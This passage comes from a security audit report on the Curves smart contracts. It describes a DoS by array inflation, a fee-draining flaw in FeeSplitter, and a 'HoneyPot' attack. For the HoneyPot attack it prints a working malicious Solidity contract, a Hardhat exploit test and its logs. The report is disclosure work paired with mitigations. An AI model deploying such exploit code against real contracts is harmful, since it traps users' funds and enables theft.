A `subjectToken` launches a presale and whitelists X number of accounts to allow them to participate in his presale. A malicious user creates new `curveTokens` using random accounts, then, using a single account buys 1 `curveTokens` of all the random `tokenSubjects`, then, proceeds to call the [`Curves::transferAllCurvesTokens() function`](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L302-L311), as a result of this, in a single call, the malicious user will inflate the `ownedCurvesTokenSubjects` array of the whitelisted account, this will cause that when the whitelisted account attempts to purchase the `curvesTokens` of the real `subjectToken` during the presale, his transaction will be reverted because his `ownedCurvesTokenSubjects` array was filled with registries of nobodies `subjectTokens`,  the array was inflated so much till the point that it can't be iterated and will fail with a gas exception. The whitelisted account has no means to pop any of those registries from his `ownedCurvesTokenSubjects` array, and as a result of this, the user who owns the whitelisted account was forcefully dosed during the presale, now, the only way for him to acquire `curveTokens` of that `tokenSubject` will be by using a different account during the open-sale.

### Recommended Mitigation Steps

The most straightforward mitigation to prevent the permanent DoS is to implement logic that allows accounts to get rid of `curveTokens` from `tokenSubjects` they don't want to own.

Make sure to implement the `pop()` functionality to the `ownedCurvesTokenSubjects` array when the account doesn't own any `curveToken` of a `tokenSubject`.
- This should be implemented in the functions [`Curves::sellCurvesToken() function`](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L282-L293) & [`Curves::_transfer() function`](https://github.com/code-423n4/2024-01-curves/blob/main/contracts/Curves.sol#L313-L325). Whenever the account's `curvesTokenBalance` is updated on any of these two functions, make sure to validate if the post balance is 0, if so, pop the `subjectToken`'s address from the `ownedCurvesTokenSubjects` array of the account.

By allowing users to have control over their `ownedCurvesTokenSubjects` array, there won't be any incentive from third parties to attempt to cause a DoS by inflating the users' `ownedCurvesTokenSubjects` array, now, each user will be able to clean up their array as they please.

A more elaborated mitigation that will require more changes across the codebase is to use `EnumerableSets` instead of arrays, and make sure to implement correctly the functions offered by the `EnumerableSets`, such as `.contain()`, `.delete()` and `.add()`.
- But in the end, the objective must be the same, allow users to have control over their `ownedCurvesTokenSubjects`, if they stop owning a `curveToken` of a certain `tokenSubject`, remove that address from the `ownedCurvesTokenSubjects` variable.


**[alcueca (Judge) commented](https://github.com/code-423n4/2024-01-curves-findings/issues/1068#issuecomment-1942403222):**
 > The impact in this report is more severe than in the duplicates; however, the root cause stays the same.

**[andresaiello (Curves) acknowledged](https://github.com/code-423n4/2024-01-curves-findings/issues/1068#issuecomment-2073077785)**

_Note: For full discussion, see [here](https://github.com/code-423n4/2024-01-curves-findings/issues/1068)._

***

## [[H-02] Unrestricted claiming of fees due to missing balance updates in `FeeSplitter`](https://github.com/code-423n4/2024-01-curves-findings/issues/247)
*Submitted by [EV\_om](https://github.com/code-423n4/2024-01-curves-findings/issues/247), also found by [lukejohn](https://github.com/code-423n4/2024-01-curves-findings/issues/1551), [Tychai0s](https://github.com/code-423n4/2024-01-curves-findings/issues/1491), [visualbits](https://github.com/code-423n4/2024-01-curves-findings/issues/1471), [Josephdara\_0xTiwa](https://github.com/code-423n4/2024-01-curves-findings/issues/1401), [kuprum](https://github.com/code-423n4/2024-01-curves-findings/issues/1396), [0x0bserver](https://github.com/code-423n4/2024-01-curves-findings/issues/1394), [peritoflores](https://github.com/code-423n4/2024-01-curves-findings/issues/1393), [Tumelo\_Crypto](https://github.com/code-423n4/2024-01-curves-findings/issues/1341), [anshujalan](https://github.com/code-423n4/2024-01-curves-findings/issues/1322), [Kose](https://github.com/code-423n4/2024-01-curves-findings/issues/1274), nonseodion ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1272), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1170)), [Aymen0909](https://github.com/code-423n4/2024-01-curves-findings/issues/1236), [grearlake](https://github.com/code-423n4/2024-01-curves-findings/issues/1225), [Kong](https://github.com/code-423n4/2024-01-curves-findings/issues/1220), 0xPhantom ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1214), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1145)), [jangle](https://github.com/code-423n4/2024-01-curves-findings/issues/1204), [rouhsamad](https://github.com/code-423n4/2024-01-curves-findings/issues/1143), Soul22 ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1139), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1135)), btk ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1127), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/916)), [0xE1](https://github.com/code-423n4/2024-01-curves-findings/issues/1089), [Ryonen](https://github.com/code-423n4/2024-01-curves-findings/issues/1074), Varun\_05 ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1053), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1044)), [0xmystery](https://github.com/code-423n4/2024-01-curves-findings/issues/1045), jacopod ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1035), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1028), [3](https://github.com/code-423n4/2024-01-curves-findings/issues/1025)), wangxx2026 ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1008), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/778)), [novodelta](https://github.com/code-423n4/2024-01-curves-findings/issues/975), ubermensch ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/956), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/955)), Draiakoo ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/941), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/939)), [0xprinc](https://github.com/code-423n4/2024-01-curves-findings/issues/894), [santipu\_](https://github.com/code-423n4/2024-01-curves-findings/issues/893), [DarkTower](https://github.com/code-423n4/2024-01-curves-findings/issues/883), 0xc0ffEE ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/850), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/848)), petro\_1912 ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/817), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/100)), [almurhasan](https://github.com/code-423n4/2024-01-curves-findings/issues/805), [Cosine](https://github.com/code-423n4/2024-01-curves-findings/issues/789), [0xNaN](https://github.com/code-423n4/2024-01-curves-findings/issues/777), zhaojie ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/745), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/744)), [khramov](https://github.com/code-423n4/2024-01-curves-findings/issues/711), [al88nsk](https://github.com/code-423n4/2024-01-curves-findings/issues/653), [mahdirostami](https://github.com/code-423n4/2024-01-curves-findings/issues/642), [Lalanda](https://github.com/code-423n4/2024-01-curves-findings/issues/636), iamandreiski ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/615), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/519)), jasonxiale ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/602), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/598)), [UbiquitousComputing](https://github.com/code-423n4/2024-01-curves-findings/issues/587), [pep7siup](https://github.com/code-423n4/2024-01-curves-findings/issues/556), [osmanozdemir1](https://github.com/code-423n4/2024-01-curves-findings/issues/541), [0xLogos](https://github.com/code-423n4/2024-01-curves-findings/issues/513), [salutemada](https://github.com/code-423n4/2024-01-curves-findings/issues/512), oreztker ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/497), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/493)), [alexfilippov314](https://github.com/code-423n4/2024-01-curves-findings/issues/477), peanuts ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/439), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/222)), [SovaSlava](https://github.com/code-423n4/2024-01-curves-findings/issues/418), [aslanbek](https://github.com/code-423n4/2024-01-curves-findings/issues/408), [SpicyMeatball](https://github.com/code-423n4/2024-01-curves-findings/issues/404), [dimulski](https://github.com/code-423n4/2024-01-curves-findings/issues/392), [BowTiedOriole](https://github.com/code-423n4/2024-01-curves-findings/issues/375), [Bobface](https://github.com/code-423n4/2024-01-curves-findings/issues/355), [Soliditors](https://github.com/code-423n4/2024-01-curves-findings/issues/334), [dopeflamingo](https://github.com/code-423n4/2024-01-curves-findings/issues/330), [nmirchev8](https://github.com/code-423n4/2024-01-curves-findings/issues/303), hals ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/298), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/297)), [Krace](https://github.com/code-423n4/2024-01-curves-findings/issues/289), [klau5](https://github.com/code-423n4/2024-01-curves-findings/issues/274), [ke1caM](https://github.com/code-423n4/2024-01-curves-findings/issues/267), [nuthan2x](https://github.com/code-423n4/2024-01-curves-findings/issues/236), [cccz](https://github.com/code-423n4/2024-01-curves-findings/issues/226), [pkqs90](https://github.com/code-423n4/2024-01-curves-findings/issues/198), AlexCzm ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/149), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/141), [3](https://github.com/code-423n4/2024-01-curves-findings/issues/134)), [0xMAKEOUTHILL](https://github.com/code-423n4/2024-01-curves-findings/issues/144), [ptsanev](https://github.com/code-423n4/2024-01-curves-findings/issues/109), [Kow](https://github.com/code-423n4/2024-01-curves-findings/issues/92), [israeladelaja](https://github.com/code-423n4/2024-01-curves-findings/issues/91), [rvierdiiev](https://github.com/code-423n4/2024-01-curves-findings/issues/68), kutugu ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/45), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/41)), [DarkTower](https://github.com/code-423n4/2024-01-curves-findings/issues/874), [peanuts](https://github.com/code-423n4/2024-01-curves-findings/issues/1523), [d3e4](https://github.com/code-423n4/2024-01-curves-findings/issues/1462), [0x0bserver](https://github.com/code-423n4/2024-01-curves-findings/issues/1437), [Aymen0909](https://github.com/code-423n4/2024-01-curves-findings/issues/1312), [0xE1](https://github.com/code-423n4/2024-01-curves-findings/issues/1232), [Soul22](https://github.com/code-423n4/2024-01-curves-findings/issues/1123), and [0xStalin](https://github.com/code-423n4/2024-01-curves-findings/issues/1066)**

The `FeeSplitter` contract is designed to distribute fees among token holders. It employs an accumulator pattern to distribute rewards over time among users who do not sell or withdraw their tokens as ERC20s. This pattern works by maintaining an accumulator representing the cumulative total of the reward rate over time, and updating it for each user every time their balance changes.

However, the current implementation does not update the accumulator associated with each user during token transfers, deposits, or withdrawals. The [`onBalanceChange()`](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L96) function, which is responsible for updating the accumulator following changes in a user's balance, is exclusively called from [`Curves._transferFees()`](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L218), which is only called during buy and sell transactions.

This oversight can be easily exploited to drain the `FeeSplitter` contract of its fees. An attacker could repeatedly transfer the same tokens to new accounts and claim fees every time. This is possible because `data.userFeeOffset[account]` will be zero for every new account they transfer to, while the claimable rewards are [calculated](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L63-L87) using the current balance returned by the Curves contract.

Since there is no limit to the amount of rewards that may accumulate in the `FeeSplitter` contract, this can be considered loss of matured yield and is hence classified as high severity.

### Proof of Concept

Consider the following scenario:

1. Alice buys any amount of curve tokens.
2. Alice transfers her tokens to a new account, Account1, by calling [`transferCurvesToken()`](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/Curves.sol#L296).
3. The `onBalanceChange()` function is not triggered during the transfer, so `data.userFeeOffset[account]` for Account1 is not updated.
4. Account1 can now call [`FeeSplitter.claimFees()`](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L80) and will receive fees as if it had been holding the tokens since the beginning, as [`data.userFeeOffset[account]`](https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L67) for this account is 0.

    <https://github.com/code-423n4/2024-01-curves/blob/516aedb7b9a8d341d0d2666c23780d2bd8a9a600/contracts/FeeSplitter.sol#L63-L88>

    ```solidity
    function updateFeeCredit(address token, address account) internal {
        TokenData storage data = tokensData[token];
        uint256 balance = balanceOf(token, account);
        if (balance > 0) {
            uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[account]) * balance;
            data.unclaimedFees[account] += owed / PRECISION;
            data.userFeeOffset[account] = data.cumulativeFeePerToken;
        }
    }

    ...

    function claimFees(address token) external {
        updateFeeCredit(token, msg.sender);
        uint256 claimable = getClaimableFees(token, msg.sender);
        if (claimable == 0) revert NoFeesToClaim();
        tokensData[token].unclaimedFees[msg.sender] = 0;
        payable(msg.sender).transfer(claimable);
        emit FeesClaimed(token, msg.sender, claimable);
    }
    ```
5. Alice creates another new account, Account2, and transfers the tokens from Account1 to Account2.
6. The `onBalanceChange(token, account)` function is not triggered during this transfer, so `data.userFeeOffset[account]` for Account2 is zero.
7. Account2 can now claim fees.
8. Alice can repeat this process, creating new accounts and transferring tokens between them, to drain the contract of its fees.

### Recommended Mitigation Steps

To mitigate this issue, the `onBalanceChange(token, account)` function should be triggered during all token transfers, deposits, and withdrawals. For token transfers, it should be triggered for both accounts. This will ensure that `userFeeOffset` is accurately tracked, preventing users from claiming fees multiple times.

**[raymondfam (Lookout) commented](https://github.com/code-423n4/2024-01-curves-findings/issues/247#issuecomment-1922519123):**
 > The root cause is due to not calling `updateFeeCredit()` diligently.

**[andresaiello (Curves) confirmed](https://github.com/code-423n4/2024-01-curves-findings/issues/247#issuecomment-2073026067)**

***

## [[H-03] Attack to make `CurveSubject` to be a `HoneyPot`](https://github.com/code-423n4/2024-01-curves-findings/issues/172)
*Submitted by [KingNFT](https://github.com/code-423n4/2024-01-curves-findings/issues/172), also found by [lukejohn](https://github.com/code-423n4/2024-01-curves-findings/issues/1550), [0xmystery](https://github.com/code-423n4/2024-01-curves-findings/issues/1518), [DimaKush](https://github.com/code-423n4/2024-01-curves-findings/issues/1392), [vnavascues](https://github.com/code-423n4/2024-01-curves-findings/issues/1387), [Matue](https://github.com/code-423n4/2024-01-curves-findings/issues/1346), [adamn000](https://github.com/code-423n4/2024-01-curves-findings/issues/1269), [Kose](https://github.com/code-423n4/2024-01-curves-findings/issues/1189), 0xDemon ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/1173), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/1172)), [jacopod](https://github.com/code-423n4/2024-01-curves-findings/issues/1157), [0xStalin](https://github.com/code-423n4/2024-01-curves-findings/issues/1070), [MrPotatoMagic](https://github.com/code-423n4/2024-01-curves-findings/issues/1064), [42TechLabs](https://github.com/code-423n4/2024-01-curves-findings/issues/1055), [oxTory](https://github.com/code-423n4/2024-01-curves-findings/issues/1047), [nnez](https://github.com/code-423n4/2024-01-curves-findings/issues/1023), [yixxas](https://github.com/code-423n4/2024-01-curves-findings/issues/1021), [ktg](https://github.com/code-423n4/2024-01-curves-findings/issues/1014), [thank\_you](https://github.com/code-423n4/2024-01-curves-findings/issues/1001), [ubermensch](https://github.com/code-423n4/2024-01-curves-findings/issues/961), [opposingmonkey](https://github.com/code-423n4/2024-01-curves-findings/issues/936), [nonseodion](https://github.com/code-423n4/2024-01-curves-findings/issues/925), [btk](https://github.com/code-423n4/2024-01-curves-findings/issues/917), [matejdb](https://github.com/code-423n4/2024-01-curves-findings/issues/877), [0xc0ffEE](https://github.com/code-423n4/2024-01-curves-findings/issues/861), [salutemada](https://github.com/code-423n4/2024-01-curves-findings/issues/853), [novodelta](https://github.com/code-423n4/2024-01-curves-findings/issues/822), [zhaojie](https://github.com/code-423n4/2024-01-curves-findings/issues/749), [\_eperezok](https://github.com/code-423n4/2024-01-curves-findings/issues/730), [sl1](https://github.com/code-423n4/2024-01-curves-findings/issues/616), [mrudenko](https://github.com/code-423n4/2024-01-curves-findings/issues/595), [PENGUN](https://github.com/code-423n4/2024-01-curves-findings/issues/571), [osmanozdemir1](https://github.com/code-423n4/2024-01-curves-findings/issues/543), [spacelord47](https://github.com/code-423n4/2024-01-curves-findings/issues/535), [mahdirostami](https://github.com/code-423n4/2024-01-curves-findings/issues/527), [DarkTower](https://github.com/code-423n4/2024-01-curves-findings/issues/523), [InAllHonesty](https://github.com/code-423n4/2024-01-curves-findings/issues/496), [SpicyMeatball](https://github.com/code-423n4/2024-01-curves-findings/issues/476), alexfilippov314 ([1](https://github.com/code-423n4/2024-01-curves-findings/issues/474), [2](https://github.com/code-423n4/2024-01-curves-findings/issues/472)), [oreztker](https://github.com/code-423n4/2024-01-curves-findings/issues/463), [Timenov](https://github.com/code-423n4/2024-01-curves-findings/issues/461), [zhaojohnson](https://github.com/code-423n4/2024-01-curves-findings/issues/449), [eeshenggoh](https://github.com/code-423n4/2024-01-curves-findings/issues/429), [SovaSlava](https://github.com/code-423n4/2024-01-curves-findings/issues/419), [dimulski](https://github.com/code-423n4/2024-01-curves-findings/issues/394), [UbiquitousComputing](https://github.com/code-423n4/2024-01-curves-findings/issues/381), [cats](https://github.com/code-423n4/2024-01-curves-findings/issues/343), [Soliditors](https://github.com/code-423n4/2024-01-curves-findings/issues/338), [nmirchev8](https://github.com/code-423n4/2024-01-curves-findings/issues/332), [darksnow](https://github.com/code-423n4/2024-01-curves-findings/issues/327), [BugzyVonBuggernaut](https://github.com/code-423n4/2024-01-curves-findings/issues/321), [hals](https://github.com/code-423n4/2024-01-curves-findings/issues/300), [ke1caM](https://github.com/code-423n4/2024-01-curves-findings/issues/266), [peanuts](https://github.com/code-423n4/2024-01-curves-findings/issues/261), [EV\_om](https://github.com/code-423n4/2024-01-curves-findings/issues/241), [cccz](https://github.com/code-423n4/2024-01-curves-findings/issues/232), [bronze\_pickaxe](https://github.com/code-423n4/2024-01-curves-findings/issues/220), [OMEN](https://github.com/code-423n4/2024-01-curves-findings/issues/174), [0xMAKEOUTHILL](https://github.com/code-423n4/2024-01-curves-findings/issues/153), [aslanbek](https://github.com/code-423n4/2024-01-curves-findings/issues/143), [israeladelaja](https://github.com/code-423n4/2024-01-curves-findings/issues/99), [Kow](https://github.com/code-423n4/2024-01-curves-findings/issues/96), and [haxatron](https://github.com/code-423n4/2024-01-curves-findings/issues/32)*, 

Any `CurveSubjects` clould be turned to a `HoneyPot` by the creator of `CurveSubject`, which causes that users can only buy but can't sell the curve tokens any more. Then malicious creators can sell their own tokens at a high price to make profit.

### Proof of Concept

1. First, please pay attention on L241 of `Curves._transferFees()` function: we can see the `referralFeeDestination` is  always be called even when `referralFee` is 0, and if the call fails the whole transaction would revert.

```solidity
File: contracts\Curves.sol
218:     function _transferFees(
...
224:     ) internal {
225:         (uint256 protocolFee, uint256 subjectFee, uint256 referralFee, uint256 holderFee, ) = getFees(price);
226:         {
227:             bool referralDefined = referralFeeDestination[curvesTokenSubject] != address(0);
228:             {
229:                 address firstDestination = isBuy ? feesEconomics.protocolFeeDestination : msg.sender;
230:                 uint256 buyValue = referralDefined ? protocolFee : protocolFee + referralFee;
231:                 uint256 sellValue = price - protocolFee - subjectFee - referralFee - holderFee;
232:                 (bool success1, ) = firstDestination.call{value: isBuy ? buyValue : sellValue}("");
233:                 if (!success1) revert CannotSendFunds();
234:             }
235:             {
236:                 (bool success2, ) = curvesTokenSubject.call{value: subjectFee}(""); 
237:                 if (!success2) revert CannotSendFunds();
238:             }
239:             {
240:                 (bool success3, ) = referralDefined
                           // @audit always be called even when referralFee is 0
241:                     ? referralFeeDestination[curvesTokenSubject].call{value: referralFee}("") 
242:                     : (true, bytes(""));
243:                 if (!success3) revert CannotSendFunds();
244:             }
245: 
246:             if (feesEconomics.holdersFeePercent > 0 && address(feeRedistributor) != address(0)) {
247:                 feeRedistributor.onBalanceChange(curvesTokenSubject, msg.sender);
248:                 feeRedistributor.addFees{value: holderFee}(curvesTokenSubject);
249:             }
250:         }
...
261:     }
```

2. And, we also find the  `referralFeeDestination` could be set and updated by creator of `CurveSubject` at any time.

```solidity
File: contracts\Curves.sol
155:     function setReferralFeeDestination(
156:         address curvesTokenSubject,
157:         address referralFeeDestination_
158:     ) public onlyTokenSubject(curvesTokenSubject) {
159:         referralFeeDestination[curvesTokenSubject] = referralFeeDestination_;
160:     }
```

By exploiting the above two facts, we can design the following malicious `EvilReferralFeeReceiver` contract. Once it was set as `ReferralFeeDestination`, the `HoneyPot` mode is enabled, users can only buy but can't sell the related curve tokens any more.

```solidity
// @note: put in file: 2024-01-curves\contracts\Test\EvilReferralFeeReceiver.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/access/Ownable.sol";

interface ICurves {
    function curvesTokenBalance(address subject, address account) external view returns (uint256);
}

contract EvilReferralFeeReceiver is Ownable {
    ICurves private _curves;
    address private _subject;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _allowlist;

    function setCurvesAndSubject(address curves, address subject) external onlyOwner {
        _curves = ICurves(curves);
        _subject = subject;
    }

    function setAllowList(address account, bool allow) external onlyOwner {
        _allowlist[account] = allow;
    }

    function updateBalances(address[] memory accounts) external onlyOwner {
        for (uint256 i; i < accounts.length; ++i) {
            address account = accounts[i];
            _balances[account] = _curves.curvesTokenBalance(_subject, account);
        }
    }

    receive() external payable {
        if (_allowlist[tx.origin]) return;
        // only buy, can't sell
        uint256 newBalance = _curves.curvesTokenBalance(_subject, tx.origin);
        if (newBalance <= _balances[tx.origin]) revert("Honey Pot");
        _balances[tx.origin] = newBalance;
    }
}
```

The full coded PoC:

<details>

```typescript
import { expect, use } from "chai";
import { solidity } from "ethereum-waffle";
use(solidity);
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
//@ts-ignore
import { ethers } from "hardhat";

import { type Curves } from "../contracts/types";
import { buyToken } from "../tools/test.helpers";
import { deployCurveContracts } from "./test.helpers";

describe("Make Curve Subject To Be A Honey Pot test", () => {
  let testContract;
  let evilReferralFeeReceiver;
  let owner: SignerWithAddress, evilSubjectCreator: SignerWithAddress,
      alice: SignerWithAddress, bob: SignerWithAddress, others: SignerWithAddress[];
  beforeEach(async () => {
    testContract = await deployCurveContracts();
    [owner, evilSubjectCreator, alice, bob, others] = await ethers.getSigners();
    const EvilReferralFeeReceiver = await ethers.getContractFactory("EvilReferralFeeReceiver");
    evilReferralFeeReceiver = await EvilReferralFeeReceiver.connect(evilSubjectCreator).deploy();
  });

  it("While 'HONEY POT' mode enabled, users can only buy, but can't sell any Curve token ", async () => {
    // 1. The evil create a subject and set a normal referral fee receiver 
    await testContract.connect(evilSubjectCreator).mint(evilSubjectCreator.address);
    await testContract.connect(evilSubjectCreator).setReferralFeeDestination(
      evilSubjectCreator.address, evilSubjectCreator.address
    );

    // 2. The evil buy enough tokens at low price
    await buyToken(testContract, evilSubjectCreator, evilSubjectCreator, 1);
    await buyToken(testContract, evilSubjectCreator, evilSubjectCreator, 10);

    // 3. victims buy or sell tokens normally
    await buyToken(testContract, evilSubjectCreator, alice, 10);
    await testContract.connect(alice).sellCurvesToken(evilSubjectCreator.address, 5);
    await buyToken(testContract, evilSubjectCreator, bob, 10);
    await testContract.connect(bob).sellCurvesToken(evilSubjectCreator.address, 5);

    // 4. at some time point, the evil enables 'HONEY POT' mode by updating the referral fee receiver
    await testContract.connect(evilSubjectCreator).setReferralFeeDestination(
      evilSubjectCreator.address, evilReferralFeeReceiver.address
    );
    await evilReferralFeeReceiver.connect(evilSubjectCreator).setCurvesAndSubject(
      testContract.address, evilSubjectCreator.address
    );
    await evilReferralFeeReceiver.connect(evilSubjectCreator).updateBalances(
      [alice.address, bob.address]
    );


    // 5. now, victims can buy, but can't sell
    await buyToken(testContract, evilSubjectCreator, alice, 1);
    let tx = testContract.connect(alice).sellCurvesToken(evilSubjectCreator.address, 1);
    expect(tx).to.revertedWith("CannotSendFunds()");

    // 6. but the evil can sell tokens normally, of course at a higher price than buy and make profit
    await  evilReferralFeeReceiver.connect(evilSubjectCreator).setAllowList(
      evilSubjectCreator.address, true
    );
    testContract.connect(evilSubjectCreator).sellCurvesToken(evilSubjectCreator.address, 11);
  });

});
```

</details>

The test logs:

<details>

```solidity
2024-01-curves> npx hardhat test ./test/MakeCurveSubjectToBeAHoneyPot.ts
No need to generate any newer typings.
 ·---------------------------|--------------------------------|--------------------------------·
 |  Solc version: 0.8.7      ·  Optimizer enabled: false      ·  Runs: 200                     │
 ····························|································|·································
 |  Contract Name            ·  Deployed size (KiB) (change)  ·  Initcode size (KiB) (change)  │
 ····························|································|·································
 |  console                  ·                 0.084 (0.000)  ·                 0.162 (0.000)  │
 ····························|································|·································
 |  Curves                   ·                23.046 (0.000)  ·                23.575 (0.000)  │
 ····························|································|·································
 |  CurvesERC20              ·                 6.813 (0.000)  ·                 8.723 (0.000)  │
 ····························|································|·································
 |  CurvesERC20Factory       ·                 9.843 (0.000)  ·                 9.874 (0.000)  │
 ····························|································|·································
 |  ERC20                    ·                 4.593 (0.000)  ·                 5.522 (0.000)  │
 ····························|································|·································
 |  EvilReferralFeeReceiver  ·                 3.407 (0.000)  ·                 3.670 (0.000)  │
 ····························|································|·································
 |  FeeSplitter              ·                 6.611 (0.000)  ·                 6.790 (0.000)  │
 ····························|································|·································
 |  Math                     ·                 0.084 (0.000)  ·                 0.162 (0.000)  │
 ····························|································|·································
 |  MerkleProof              ·                 0.084 (0.000)  ·                 0.162 (0.000)  │
 ····························|································|·································
 |  MockCurvesForFee         ·                 0.861 (0.000)  ·                 0.893 (0.000)  │
 ····························|································|·································
 |  MockERC20                ·                 5.902 (0.000)  ·                 6.944 (0.000)  │
 ····························|································|·································
 |  Security                 ·                 0.847 (0.000)  ·                 1.025 (0.000)  │
 ····························|································|·································
 |  SignedMath               ·                 0.084 (0.000)  ·                 0.162 (0.000)  │
 ····························|································|·································
 |  Strings                  ·                 0.084 (0.000)  ·                 0.162 (0.000)  │
 ·---------------------------|--------------------------------|--------------------------------·

  Make Curve Subject To Be A Honey Pot test
    ✔ While 'HONEY POT' mode enabled, users can only buy, but can't sell any Curve token 

·---------------------------------------------------------|----------------------------|-------------|-----------------------------·
|                   Solc version: 0.8.7                   ·  Optimizer enabled: false  ·  Runs: 200  ·  Block limit: 30000000 gas  │      
··························································|····························|·············|······························      
|  Methods                                                                                                                         │      
····························|·····························|·············|··············|·············|···············|··············      
|  Contract                 ·  Method                     ·  Min        ·  Max         ·  Avg        ·  # calls      ·  eur (avg)  │      
····························|·····························|·············|··············|·············|···············|··············      
|  Curves                   ·  buyCurvesToken             ·      67030  ·      142555  ·     111636  ·            5  ·          -  │      
····························|·····························|·············|··············|·············|···············|··············      
|  Curves                   ·  mint                       ·          -  ·           -  ·    1688644  ·            1  ·          -  │      
····························|·····························|·············|··············|·············|···············|··············      
|  Curves                   ·  sellCurvesToken            ·      63915  ·       66404  ·      65574  ·            3  ·          -  │      
····························|·····························|·············|··············|·············|···············|··············      
|  Curves                   ·  setReferralFeeDestination  ·      27806  ·       44906  ·      36356  ·            2  ·          -  │      
····························|·····························|·············|··············|·············|···············|··············      
|  EvilReferralFeeReceiver  ·  setAllowList               ·          -  ·           -  ·      46749  ·            1  ·          -  │      
····························|·····························|·············|··············|·············|···············|··············      
|  EvilReferralFeeReceiver  ·  setCurvesAndSubject        ·          -  ·           -  ·      69075  ·            1  ·          -  │      
····························|·····························|·············|··············|·············|···············|··············      
|  EvilReferralFeeReceiver  ·  updateBalances             ·          -  ·           -  ·      86201  ·            1  ·          -  │      
····························|·····························|·············|··············|·············|···············|··············      
|  FeeSplitter              ·  setCurves                  ·          -  ·           -  ·      44119  ·            1  ·          -  │      
····························|·····························|·············|··············|·············|···············|··············      
|  FeeSplitter              ·  setManager                 ·          -  ·           -  ·      46637  ·            1  ·          -  │      
····························|·····························|·············|··············|·············|···············|··············      
|  Deployments                                            ·                                          ·  % of limit   ·             │      
··························································|·············|··············|·············|···············|··············      
|  Curves                                                 ·          -  ·           -  ·    5232831  ·       17.4 %  ·          -  │      
··························································|·············|··············|·············|···············|··············      
|  CurvesERC20Factory                                     ·          -  ·           -  ·    2217610  ·        7.4 %  ·          -  │      
··························································|·············|··············|·············|···············|··············      
|  EvilReferralFeeReceiver                                ·          -  ·           -  ·     831586  ·        2.8 %  ·          -  │      
··························································|·············|··············|·············|···············|··············      
|  FeeSplitter                                            ·          -  ·           -  ·    1558984  ·        5.2 %  ·          -  │      
·---------------------------------------------------------|-------------|--------------|-------------|---------------|-------------·      

  1 passing (2s)
```

</details>

### Recommended Mitigation Steps

Solady's `forceSafeTransferETH()` seems suitable for this case:

<https://github.com/Vectorized/solady/blob/61612f187debb7affbe109543556666ef716ef69/src/utils/SafeTransferLib.sol#L117>


**[andresaiello (Curves) confirmed](https://github.com/code-423n4/2024-01-curves-findings/issues/172#issuecomment-1908675626)**

**[alcueca (Judge) commented](https://github.com/code-423n4/2024-01-curves-findings/issues/172#issuecomment-1922288714):**
 > Keeping as High because with this the DAO controlling the platform would have to do an enormous effort to keep scammers out.

***

## [[H-04] Unauthorized Access to `setCurves` Function](https://github.com/code-423n4/2024-01-curves-findings/issues/4)
